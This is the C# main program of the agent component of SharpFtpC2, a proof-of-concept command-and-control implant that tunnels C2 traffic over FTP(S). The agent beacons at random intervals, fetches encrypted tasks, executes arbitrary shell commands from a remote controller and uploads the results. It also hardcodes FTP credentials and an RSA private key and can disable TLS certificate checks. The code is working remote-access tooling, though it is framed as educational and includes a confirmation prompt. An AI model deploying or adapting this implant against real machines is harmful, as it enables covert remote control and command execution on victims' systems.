/*
 * =========================================================================================
 * Project:       SharpFtpC2 - Agent (v1.0 Beta)
 * 
 * Description:   SharpFtpShell is a compact C# project that showcases the technique
 *                of tunneling Command and Control (C2) communication via FTP(S).
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpAgent;
using FtpC2.Responses;
using FtpC2.Tasks;
using System.Net;
using System.Text;
using System.Text.Json;

class Program
{
    // In this Proof of Concept (PoC), the "AgentSession" GUID changes with each process instance.
    // If you require a unique identifier for each machine/user, it is advisable to replace this code
    // with a custom logic tailored to your needs.
    public static readonly Guid AgentSession = Guid.NewGuid();

    // EDIT HERE BEGIN ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    public static readonly string FtpHost = "127.0.0.1";
    public static readonly string FtpUser = "dark";
    public static readonly string FtpPwd = "toor";
    public static readonly bool FtpSecure = false;

    public static readonly int BeaconDelayMin = 500;
    public static readonly int BeaconDelayMax = 1000;

    // Ensure that this contains the RSA Public / Private Key for the Agent, which is used to decrypt data received
    // from the C2. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
    public static readonly string EncodedPublicKey = "MIICCgKCAgEA6+URNSenrF9brgbRwEcxio7/N0D+6ZsL32Kx/j2/GVJPC4q3nwodBZDhsZalzi/CFdk4h0jiDyhTeSmU+Vq8RibQksPI0UbwL3+Mnuhrb13UifGoKMoaIY31vLMEeJ7Onyxnf15XiV4r2LorMHTwlqd1gyMR6dAu5nzshKA8yle06qrPpTP10pw7pR/iznKI/LAyJes/ox5JbO/Z1tmjtMDChx1+FgZB1wbSAlAw7fh04C3KH24vvobd5a1gMLGqBbAu3EWMXhj2Io/8aAq8f1nvau068Dl7tyD6ybD7/pam3XN3O30Grqcp2093ZnQvNbfTTaeLjZ1fs3MFkwzMXxtoKXtivqyLBH96ZI8IEMKG9IDGxPaOfIePJr7AyTinZ1g3Y/IIWor9v+wwAl8QuWf2zOTnBXSzN2jXKUDz29u3ITkhRnZJm0Vkma1Nuo6n7OB5m4lbUTQB4/cMNihUOvDSkPwh+uQF8loNQDLH5zO9oIEpdzoonsMmntOqYQMk2+uPGAF7/p3ZzRDsayhsbuHvnwzVbY8Tp9xedDj85TorehmPJJsTYmDsOahhh57E5Lpcfze32dO83z3slVHp/fYNpfHMLakV/gn0bvJFohCpCvxyUR6zSRVvvrPA0mHUAJPviX5lnenTTg8pwBLiBcGOGvdBromUDqCHlxQgEH0CAwEAAQ=="; 
    public static readonly string EncodedPrivateKey = "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";

    // Make sure this includes the RSA Public Key belonging to the C2, which is utilized for encrypting
    // data that is sent to the C2's destination.
    public static readonly string EncodedPeerPublicKey = "MIICCgKCAgEAwCgvEs3M3Xq9VsIokZcJCiZJBIvnpDsBh+TMHOFKKmkIAS43HtyxOJgCV4tJYyNLtnZXxym2FN4Y0AHuWcuub/4OfwhbmSll1LrcOymNJT8a8uSh2FkxPdYr3/TG18uPEvJ9KJhrPp2qyakCN3/URltcO/tFw7ETmauRKslUCNP1fgq71wE08B2dJfwjWa04x9pem90e5bXVg4JmJtdAoFNI++FFueg+/ohUtg13ZiY+U6Lz2tYcVoHATcMoGfERJeXJaOzOTsDCWxqrjAhQeN+NlFtT4euvH5e3Xb/7EivS4T3fdA0dMAy0iZ4Cf9je8C2GMst0pYwHQcW12LASwrmm90BBz/gFMLsBv/nrptQ1NbkFfdlDPf+kA0Ei3Q6CZoybIr9BOBbEEi59IH+0i3ILJF0YRLcOhaTmC6UKBvItq9YG/68VnFyuqb4cKf7mLN3fhF5RopLWjNGxdkwd5JqGl0dmDEnSjOcWRF46MSd2uVYtICtqVA2WN7IEpnOpbhnmYnwE1Dp/lTy4VW9oBGpnMxbfB2RISdOwFf+h59kDmUlYX1RgButpEmkklOQLOZHYEiLg1Pd5j+OyuTU84zZObcQC1VA8SGq6PStoh5S4dbgPRmEjHG8MBPPHBrr51ozid5T2k8UHOFeBn1QBXuODr0lGVgpyHy6MFtj7Dg0CAwEAAQ==";
    // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  

    public static readonly object _MainThreadLock = new();

    public static CancellationTokenSource CancellationTokenSource = new();

    public static void OnProcessExit(object? sender, EventArgs e)
    {
        ///
    }

    public static bool OnDangerousActionConfirmation(string nature)
    {
        lock (_MainThreadLock)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine();
            Console.WriteLine($"[!] Before proceeding (Task: `{nature}`), please be aware that the action you are about to perform has the potential to be dangerous and may have unintended consequences. This tool is intended for educational purposes and should be used responsibly. Are you sure you want to proceed? Understanding the implications, please type `YES` or `Y` to confirm or anything else to abort the action.");
            Console.ResetColor();

            Console.Write("Answer: ");            

            string? answer = Console.ReadLine();
            if (answer == null)
                return false;

            string upperAnswer = answer.ToUpper();

            return upperAnswer == "YES" || upperAnswer == "Y";
        }
    }

    public static void Main(string[] args)
    {
        // Important Notice: The delegate below renders the current application susceptible to
        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
        // This configuration was implemented to accommodate self-signed certificates.
        // However, it is strongly advised not to employ this approach in a production environment
        // if SSL/TLS security is expected.
        if (FtpSecure)
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ///

        AppDomain.CurrentDomain.ProcessExit += OnProcessExit;

        UX.DisplayInfo($"Agent Id: `{AgentSession}`");
        ///

        List<Thread> daemons = new();

        // It is crucial for this thread to maintain high availability in order to continuously
        // signal to the Command and Control (C2) that our agent is operational.
        // To achieve this, only the "RegisterOrUpdateAgent" method is invoked at regular intervals,
        // minimizing resource consumption and ensuring consistent communication with the C2.
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            AgentProtocol agentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);

            agentProto.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
            agentProto.SetupPeerEncryptionHelper(EncodedPeerPublicKey);

            agentProto.DangerousActionConfirmation += OnDangerousActionConfirmation;

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Signal C2, we are still active.
                    agentProto.RegisterOrUpdateAgent();

                    ///
                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax));
                }
                catch (Exception ex) 
                {
                    UX.DisplayError($"@DaemonBeaconThread: {ex.Message}");
                };
            }
        }));

        // This thread is specifically allocated for the enumeration of agent tasks
        // (which are registered by the controller) as well as the processing and response
        // of these tasks. This ensures a focused and efficient handling of agent-related
        // tasks.
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            AgentProtocol agentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);

            agentProto.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
            agentProto.SetupPeerEncryptionHelper(EncodedPeerPublicKey);

            agentProto.DangerousActionConfirmation += OnDangerousActionConfirmation;

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Gather C2 Tasks.
                    List<TaskWrapper> tasks = agentProto.EnumerateTasks();                    

                    // Process Tasks:
                    foreach (TaskWrapper task in tasks)
                    {
                        ResponseWrapper? response = null;
                        ///

                        UX.DisplayInfo($"Process new task(`{task.Id}`) of type `{task.GetType().Name}`...");

                        switch (task)
                        {
                            case TaskShellCommand taskShellCommand:
                                {
                                    response = new ResponseShellCommand();

                                    ((ResponseShellCommand)response).RunShellCommand(taskShellCommand.Command ?? "");                                    

                                    break;
                                }

                            case TaskCommand taskCommand:
                                {
                                    switch(taskCommand.Command)
                                    {
                                        case TaskCommand.CommandKind.TerminateAgent:
                                            {
                                                CancellationTokenSource.Cancel();

                                                response = new ResponseNotification();

                                                ((ResponseNotification)response).Kind = ResponseNotification.NotificationKind.AgentTerminated;                                                

                                                break;
                                            }
                                    }

                                    break;
                                }

                            // Handle other tasks and response bellow:
                            // ...

                            default:
                                {
                                    UX.DisplayWarning($"Task(`{task.Id}`) of type `{task.GetType().Name}` is unknown.");

                                    break;
                                }
                        }

                        if (response != null)
                        {
                            agentProto.RegisterNewResponse(response, task.Id);

                            UX.DisplaySuccess($"Task(`{task.Id}`) successfully processed.");
                        }
                    }                                       

                    ///
                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax));
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonTasksThread: {ex.Message}");
                };
            }
        }));

        // The action to handle a CTRL+C signal on the console has been registered.
        // When triggered, it will instruct any associated cancellation tokens to properly
        // shut down their associated daemons.
        Console.CancelKeyPress += (sender, cancelEventArgs) =>
        {
            CancellationTokenSource.Cancel(); // Signal tokens that application needs to be closed.

            cancelEventArgs.Cancel = true; // Cancel default behaviour
        };

        // Start daemons
        foreach (Thread daemon in daemons)
            daemon.Start(CancellationTokenSource.Token);

        // Keep process running until CTRL+C.
        CancellationToken token = CancellationTokenSource.Token;
        while (!token.IsCancellationRequested)
            Thread.Sleep(1000);

        // Wait for daemons to join main thread
        foreach (Thread daemon in daemons)
            daemon.Join();
    }
}